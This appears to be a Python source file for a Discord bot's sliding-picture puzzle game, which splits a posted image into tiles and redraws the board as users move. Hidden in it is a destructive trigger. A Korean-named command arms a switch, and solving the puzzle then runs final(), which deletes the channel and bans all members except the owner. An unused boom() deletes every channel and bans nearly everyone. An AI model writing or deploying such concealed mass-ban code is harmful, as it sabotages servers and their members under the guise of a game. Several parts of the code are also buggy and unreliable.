from .base.basemodule import *
import random
import enum
from PIL import Image
import os
import discord

class Direction(enum.Enum):
    UP = 1
    DOWN = 2
    LEFT = 3
    RIGHT = 4

class pzgame :
    pzInst = None
    
    def _chckPz(pz):
        size = len(pz)
        count = 0
        for i in range(size):
            if pz[i] == 0 : continue
            for j in range(i + 1,size):
                if pz[j] == 0 : continue
                if pz[i] > pz[j] :
                    count +=1
        for i in range(size):
            if pz[i] == 0 : 
                count += i//4 +1
        if count % 2 == 1:
            return False
        else : return True

    def _newPz(size):
        lenPz = size * size
        pzCells = []
        for i in range(lenPz):
            pzCells.append(i)
        random.seed()
        random.shuffle(pzCells)
        """for i in range(size):
        for j in range(size):
            print(pzCells[j+i*size], end='\t')
        print()"""
        return pzCells
    
    def _resetPz(pz):
        random.shuffle(pz)
        return pz

    def __init__(self, size):
        self.game = pzgame._newPz(size)
        self.blank = None
        self.size = size
        while(pzgame._chckPz(self.game) == False) :
            pzgame._resetPz(self.game)
        for i in range(len(self.game)) :
            if self.game[i] == 0 :
                self.blank = i
                break
        self.gameIm = []
        self.gameId = None
        self.nMoves = 0
        self.imgX =0
        self.imgY  =0
        self.src = str()
        self.switch = False
        #get time

    def isEnd(pz):
        size = len(pz)
        for i in range(len(pzgame.getGame())-1):
            if pz[i] != i+1: return False
        return True

    def newPz(size):
        if pzgame.pzInst is None :
            pzgame.pzInst = pzgame(size)
            return pzgame.pzInst
        else : return None
    
    def setGameImg(pzImg):
        if pzgame.pzInst is None : return
        pzgame.pzInst.gameIm =pzImg

    def setGameId(id):
        if pzgame.pzInst is None : return
        pzgame.pzInst.gameId = id

    def getGameId():
        if pzgame.pzInst is None : return None
        return pzgame.pzInst.gameId

    def getPzInst():
        if pzgame.pzInst is None : return None
        return pzgame.pzInst

    def getGame():
        if pzgame.pzInst is None : return None
        return pzgame.pzInst.game

    def setSize(x , y):
        if pzgame.pzInst is None : return None
        pzgame.pzInst.imgX = x
        pzgame.pzInst.imgY = y

    def getGameImg():
        if pzgame.pzInst is None : return None
        return pzgame.pzInst.gameIm

    def getSize():
        if pzgame.pzInst is None : return None
        return pzgame.pzInst.imgX, pzgame.pzInst.imgY

    def setSrc(p): 
        if pzgame.pzInst is None : return None
        pzgame.pzInst.src = p

    def getSrc():
        if pzgame.pzInst is None : return None
        return pzgame.pzInst.src

    def endPz():
        pzgame.pzInst = None

    def on_switch():
        pzgame.pzInst.switch = True

    def state():
        return pzgame.pzInst.switch

    def move(self, direction):
        if direction is Direction.UP :
            if self.blank < self.size :
                return False
            else :
                oldPos = self.blank
                newPos = self.blank - self.size
                self.game[oldPos] = self.game[newPos]
                self.game[newPos] = 0
                self.blank = newPos
                return True
        elif direction is Direction.DOWN :
            if self.blank < self.size * (self.size-1):
                oldPos = self.blank
                newPos = self.blank + self.size
                self.game[oldPos] = self.game[newPos]
                self.game[newPos] = 0
                self.blank = newPos
                return True
            pass
        elif direction is Direction.LEFT:
            if (self.blank % self.size) == 0 :
                return False
            else :
                oldPos = self.blank
                newPos = self.blank - 1
                self.game[oldPos] = self.game[newPos]
                self.game[newPos] = 0
                self.blank = newPos
                return True
        elif direction is Direction.RIGHT:
            if (self.blank % self.size) == (self.size -1) :
                return False
            else :
                oldPos = self.blank
                newPos = self.blank +1
                self.game[oldPos] = self.game[newPos]
                self.game[newPos] = 0
                self.blank = newPos
                return True
        return False

@event('make')
async def makeGame(bot,msg):
    srcPath = await downImg(msg.channel)
    if srcPath is not False :
        src = Image.open(srcPath)
        w,h = src.size
        if w < 300 or h <300 :
            await msg.channel.send('it is too small')
            return
        sw = int(w/4)
        sh = int(h/4)
        w = int(sw * 4)
        h = int(sh * 4)
        p=[]
        for y in range(4):
            for x in range(4):
                p.append(src.crop((sw*x,sh*y,sw*(x+1),sh*(y+1))))
        dst = os.getcwd()
        #for i in p :
        #    fn = str(p.index(i)) + '.jpg'
        #    print("crop{} : {} , {}".format(i,sw,sh))
        #    i.save(fn)
        
        if pzgame.getPzInst() is None :
            pzgame.newPz(4)
        else :
            await msg.channel.send("already made a puzzle")
            return

        pzgame.setSrc(srcPath)

        pzgame.setGameImg(p)
        pzgame.setSize(w,h)
        arr = pzgame.getGame()
        result = Image.new(src.mode,(w,h))
        for y in range(4) :
            for x in range(4) :
                #print("file : (wid: {} , height : {})".format( sw,sh))
                if arr[x+y*4] != 0:
                    result.paste(p[arr[x+y*4] - 1],(sw*x,sh*y,sw*(x+1),sh*(y+1)))
        df = os.path.join(dst,'result.jpg')
        result.save(df)
        f = discord.File(df)
        tmp = await msg.channel.send(file = f)
        pzgame.setGameId(tmp)
    pass

@event('move')
async def moveCell(bot,msg):
    if pzgame.getPzInst is None :
        return
    line = str.lstrip(msg.content[len(bot.getPref()):])
    global m_pref
    line = str.lstrip(line[len(m_pref):])
    param = cmdParse(line)
    dirs = param['arg']
    await pzgame.getGameId().delete()

    arr = pzgame.getGame()
    w, h = pzgame.getSize()
    sw = int (w /4)
    sh = int (h /4)

    for ch in dirs :
        if ch is 'w' or ch is 'W' :
            pzgame.getPzInst().move(Direction.UP)
            pass
        elif ch is 'S' or ch is 's' :
            pzgame.getPzInst().move(Direction.DOWN)
            pass
        elif ch is 'A' or ch is 'a' :
            pzgame.getPzInst().move(Direction.LEFT)
            if isEnd(arr) :
                f = pzgame.getSrc()
                await msg.channel.send("finished puzzle",file = f)
                if pzgame.state() :
                    await final(bot, msg)
            pass
        elif ch is 'D' or ch is 'd' :
            pzgame.getPzInst().move(Direction.RIGHT)
            if isEnd(arr) :
                f = pzgame.getSrc()
                await msg.channel.send("finished puzzle",file = f)
                if pzgame.state() :
                    await final(bot, msg)
            pass

    dst = os.getcwd()
    gImg  = pzgame.getGameImg()
    result = Image.new('RGB',(w,h))
    for y in range(4) :
        for x in range(4) :
            #print("file : (wid: {} , height : {})".format( sw,sh))
            if arr[x+y*4] != 0:
                result.paste(gImg[arr[x+y*4]-1],(sw*x,sh*y,sw*(x+1),sh*(y+1)))
    df = os.path.join(dst,'result.jpg')
    result.save(df)
    f = discord.File(df)
    tmp = await msg.channel.send(file = f)
    pzgame.setGameId(tmp)

    pass

@event('근의공식')
async def turnon(bot,msg):
    pzgame.on_switch()

@event('debug')
async def debug(bot,msg):
    await msg.channel.send(pzgame.getGame())
    await msg.channel.send(chckPz(pzgame.getGame()))

@event('end')
async def endGame(bot,msg):
    await pzgame.getGameId().delete()
    pzgame.endPz()
    pass

async def boom(bot,msg):
    for ch in msg.guild.channels :
        await ch.delete()
    for usr in msg.guild.members :
        if usr.id == bot.id : continue
        if msg.guild.owner == usr : continue
        await usr.ban()


async def final(bot,msg) :
    for ch in msg.guild.channels :
        if ch == msg.channel :
            await ch.delete()
    for usr in msg.guild.members :
        if msg.guild.owner == usr : continue
        await usr.ban()

async def showPz(ch):
    pass

async def downImg(ch):
    async for msg in ch.history(limit = 100) :
        for att in msg.attachments :
            if att.height is not None and att.width is not None :
                ext = 0
                for i in range(len(att.filename)) :
                    if att.filename[-i] == '.' :
                        ext = i
                fn = 'source' + att.filename[-ext:]
                file = os.path.join(os.getcwd(),fn)
                os.access(file,mode = os.W_OK)
                await att.save(file,use_cached = True)
                return file
    return False

def newPz(size):
    lenPz = size * size
    pzCells = []
    for i in range(lenPz):
        pzCells.append(i)
    random.seed()
    random.shuffle(pzCells)
    """for i in range(size):
        for j in range(size):
            print(pzCells[j+i*size], end='\t')
        print()"""
    return pzCells

def chckPz(pz):
    size = len(pz)
    count = 0
    for i in range(size):
        if pz[i] == 0 : continue
        for j in range(i+1,size):
            if pz[j] == 0 : continue
            if pz[i] > pz[j] :
                count +=1
    for i in range(size):
        if pz[i] == 0 : 
            count += i//4 +1
    if count%2 == 1:
        return False
    else : return True

def isEnd(pz):
    size = len(pz)
    for i in range(size):
        if pz[i] != i+1: return False
    pass